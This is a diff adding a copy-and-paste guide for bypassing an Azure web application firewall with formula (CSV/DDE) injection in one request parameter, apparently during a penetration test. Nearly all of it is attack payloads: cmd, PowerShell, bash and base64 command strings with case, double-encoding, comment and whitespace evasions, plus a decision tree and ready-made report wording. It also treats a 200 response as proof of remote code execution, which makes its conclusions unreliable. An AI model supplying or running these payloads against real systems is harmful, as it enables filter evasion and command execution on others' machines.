@@ -1,0 +1,267 @@
+===================================================================================
+QUICK WAF BYPASS PAYLOADS - COPY & PASTE INTO BURP
+===================================================================================
+
+HOW TO USE:
+1. In Burp Repeater, find: AddEditPlanSubCode.PlanSubCodeKey=
+2. Replace value with payload below
+3. Send request
+4. Check: 200 OK = Success (means WAF let it through or vulnerable)
+       403 = Blocked by WAF (try next payload)
+
+===================================================================================
+STEP 1: TEST BASELINE (Does backend accept formulas at all?)
+===================================================================================
+
+BASELINE 1 - Copy and paste this:
+=1%2B1
+
+Expected: 200 OK (no dangerous keywords, should pass)
+
+BASELINE 2 - If baseline 1 fails, try:
+="Hello"%26"World"
+
+Expected: 200 OK (string concat, should pass)
+
+BASELINE 3 - If both fail:
+=7*7
+
+Expected: 200 OK (simple math)
+
+*** If ANY of these 3 return 200 OK, go to STEP 2 ***
+*** If ALL return 403, WAF is blocking all formula input ***
+
+===================================================================================
+STEP 2: TEST WHAT'S BLOCKED (Which keyword triggered 403?)
+===================================================================================
+
+TEST A - Dangerous payload (will get 403):
+=cmd%7C%27%2Fc+calc%27%21A1
+
+Expected: 403 Forbidden (WAF blocks "cmd" keyword)
+
+TEST B - Alternative dangerous payload:
+=powershell+%22Write-Host+test%22%21A1
+
+Expected: 403 Forbidden (WAF blocks "powershell")
+
+*** Note which keywords triggered the 403 error ***
+
+===================================================================================
+STEP 3: TRY CASE VARIATION BYPASS (Simplest bypass technique)
+===================================================================================
+
+BYPASS 1 - Uppercase cmd:
+=CMD%7C%27%2Fc+CALC%27%21A1
+
+Try this if lowercase "cmd" was blocked
+
+BYPASS 2 - Mixed case:
+=CmD%7C%27%2Fc+CaLc%27%21A1
+
+BYPASS 3 - Uppercase powershell:
+=POWERSHELL+%22Write-Host+test%22%21A1
+
+Try this if lowercase "powershell" was blocked
+
+BYPASS 4 - Mixed case powershell:
+=PoWeRsHeLL+%22Write-Host+test%22%21A1
+
+*** Test these if step 2 blocked lowercase versions ***
+
+===================================================================================
+STEP 4: TRY DOUBLE ENCODING BYPASS
+===================================================================================
+
+BYPASS 5 - Double encoded cmd:
+=cmd%252C%257C%2527%252Fc+calc%2527%2521A1
+
+BYPASS 6 - Double encoded powershell:
+=powershell%252F%252F%2522Write-Host%2522%21A1
+
+*** If case variation didn't work, try these ***
+
+===================================================================================
+STEP 5: TRY COMMENT INJECTION BYPASS
+===================================================================================
+
+BYPASS 7 - Comment in middle:
+=cmd/**/|'/c calc'!A1
+
+BYPASS 8 - Backtick escape (PowerShell):
+=c`md|'/c calc'!A1
+
+BYPASS 9 - Double slash comment:
+=cmd%2F%2F|'/c calc'!A1
+
+BYPASS 10 - Hash comment:
+=cmd%23|'/c calc'!A1
+
+===================================================================================
+STEP 6: TRY WHITESPACE INJECTION BYPASS
+===================================================================================
+
+BYPASS 11 - Extra spaces:
+=cmd    |'/c    calc'!A1
+
+BYPASS 12 - Space in keyword:
+=c m d|'/c calc'!A1
+
+BYPASS 13 - Tab character:
+=cmd%09|'/c%09calc'!A1
+
+BYPASS 14 - Newline injection:
+=cmd%0A|'/c%0Acalc'!A1
+
+===================================================================================
+STEP 7: TRY ALTERNATIVE COMMAND SYNTAX
+===================================================================================
+
+BYPASS 15 - Use powershell.exe instead of powershell:
+=powershell.exe+%22Write-Host+HACKED%22!A1
+
+BYPASS 16 - Use bash instead of cmd:
+=bash+-c+%22whoami%22!A1
+
+BYPASS 17 - Use sh instead:
+=sh+-c+%22id%22!A1
+
+BYPASS 18 - Full powershell path:
+=C:%5CWindows%5CSystem32%5CWindowsPowerShell%5Cv1.0%5Cpowershell.exe!A1
+
+===================================================================================
+STEP 8: TRY ENCODING SPECIAL CHARACTERS
+===================================================================================
+
+BYPASS 19 - Encode pipe as %7C:
+=cmd%7C'/c calc'!A1
+
+BYPASS 20 - Encode quotes as %27:
+=cmd%7C%27/c calc%27!A1
+
+BYPASS 21 - Encode exclamation as %21:
+=cmd|'/c calc%27%21A1
+
+BYPASS 22 - All characters encoded:
+=cmd%7C%27%2Fc%20calc%27%21A1
+
+===================================================================================
+STEP 9: TRY OBFUSCATION TECHNIQUES
+===================================================================================
+
+BYPASS 23 - Variable assignment:
+=($x=%27cmd%27);& $x|'/c calc'!A1
+
+BYPASS 24 - String concatenation:
+=((%27c%27%2B%27m%27%2B%27d%27))|'/c calc'!A1
+
+BYPASS 25 - Base64 encoded (execute base64):
+=powershell+-e+JABjAG0AZAAgAD0AIgBjbWQi!A1
+
+BYPASS 26 - Environment variable:
+=$env:windir%5Csystem32%5Ccmd.exe|'/c calc'!A1
+
+===================================================================================
+COMPREHENSIVE TEST SEQUENCE (Use if confused)
+===================================================================================
+
+Copy each one, send in Burp, check response code, move to next:
+
+1. =1%2B1                                          (Baseline)
+2. =7*7                                            (Baseline)
+3. ="Hello"%26"World"                              (Baseline)
+4. =cmd%7C%27%2Fc+calc%27%21A1                    (Should be 403)
+5. =CMD%7C%27%2Fc+CALC%27%21A1                    (Case bypass)
+6. =CmD%7C%27%2Fc+CaLc%27%21A1                    (Mixed case)
+7. =cmd/**/|'/c calc'!A1                          (Comment bypass)
+8. =cmd    |'/c    calc'!A1                       (Whitespace)
+9. =powershell.exe "Write-Host test"!A1           (Alt syntax)
+10. =cmd%252C%257C%2527%252Fc+calc%2527%2521A1   (Double encode)
+
+Stop when you get 200 OK on a dangerous payload!
+
+===================================================================================
+DECISION TREE
+===================================================================================
+
+START
+  ↓
+Are baselines (=1+1, =7*7) returning 200 OK?
+  ├─ YES → Go to "Which keyword blocked dangerous payloads?"
+  └─ NO → All formula input blocked, WAF too strict
+  
+Which keyword blocked dangerous payloads?
+  ├─ "cmd" blocked → Try case variation (CMD, CmD)
+  ├─ "powershell" blocked → Try powershell.exe or case variation
+  ├─ "|" (pipe) blocked → Try %7C encoding
+  └─ Multiple blocked → Try comment injection or obfuscation
+
+Did case variation bypass work?
+  ├─ YES → CRITICAL, document and stop
+  └─ NO → Try double encoding or comment injection
+
+Did any bypass return 200 OK?
+  ├─ YES → CRITICAL RCE vulnerability found
+  ├─ NO → Check if formula appears in table anyway
+  └─ NO → WAF successfully blocking all attempts
+
+===================================================================================
+WHAT EACH SUCCESS MEANS
+===================================================================================
+
+Baseline (=1+1) returns 200 OK:
+└─ Backend accepts formula syntax
+└─ Only dangerous keywords are blocked by WAF
+└─ Finding: "Backend vulnerable to formula injection"
+
+Case variation bypass returns 200 OK:
+└─ WAF has case-sensitive blocklist
+└─ Can execute arbitrary code
+└─ Finding: "Critical: WAF bypass via case variation"
+
+Double encoding returns 200 OK:
+└─ WAF decodes once, application decodes again
+└─ Backend executes formula
+└─ Finding: "Critical: WAF bypass via double encoding"
+
+Comment injection returns 200 OK:
+└─ WAF can't parse comments
+└─ Keywords hidden in comments
+└─ Finding: "Critical: WAF bypass via comment injection"
+
+===================================================================================
+QUICKEST TEST PATH (If you only try 5 payloads)
+===================================================================================
+
+1. =1%2B1                          (Does backend accept formulas?)
+2. =cmd%7C%27%2Fc+calc%27%21A1   (Is "cmd" blocked by WAF?)
+3. =CMD%7C%27%2Fc+CALC%27%21A1   (Does case variation bypass WAF?)
+4. =cmd/**/|'/c calc'!A1          (Does comment injection bypass WAF?)
+5. =cmd    |'/c    calc'!A1       (Does whitespace bypass WAF?)
+
+If ANY return 200 OK on payloads 2-5 → You found the bypass!
+
+===================================================================================
+COPY THIS EXACT TEXT FOR YOUR REPORT
+===================================================================================
+
+If simple formula works (200 OK):
+"The application backend accepts formula syntax. Azure WAF is blocking 
+dangerous keywords like 'cmd' and 'powershell', but case variation and 
+encoding bypasses may be possible."
+
+If case variation bypasses WAF (200 OK):
+"Azure WAF blocklist is case-sensitive. Uppercase and mixed-case variations
+bypass the filter. The underlying application is vulnerable to formula 
+injection and arbitrary code execution (RCE) is possible."
+
+If any bypass returns 200 OK:
+"Formula injection vulnerability confirmed. Azure WAF can be bypassed using
+[technique name]. The application accepts and evaluates formulas, leading to
+remote code execution. This is a CRITICAL vulnerability."
+
+===================================================================================
+
+Start with STEP 1, work through steps in order.
+Report back with responses and which payloads succeeded!
+
